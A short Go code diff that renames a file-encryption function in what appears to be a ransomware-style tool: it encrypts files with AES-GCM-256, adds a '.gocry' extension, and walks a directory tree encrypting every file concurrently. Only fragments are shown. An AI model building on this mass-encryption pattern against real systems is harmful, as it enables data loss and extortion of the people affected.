@@ -15,7 +15,7 @@ import (
 
 // encryptSingleFile takes in a file path and a 32-bit random key and uses AES-GCM-256 encryption
 // to encrypt the file. It also adds the .gocry extension to the files.
-func encryptSingleFile(wg *sync.WaitGroup, path string, key []byte) error {
+func aesgcmEncrypt(wg *sync.WaitGroup, path string, key []byte) error {
 	data, err := ioutil.ReadFile(path)
 	if err != nil {
 		wg.Done()
@@ -73,7 +73,7 @@ func EncryptRoot(startingPath string, key *memguard.Enclave) error {
 		}
 
 		wg.Add(1)
-		go encryptSingleFile(&wg, path, b.Bytes())
+		go aesgcmEncrypt(&wg, path, b.Bytes())
 
 		return nil
 	}); err != nil {
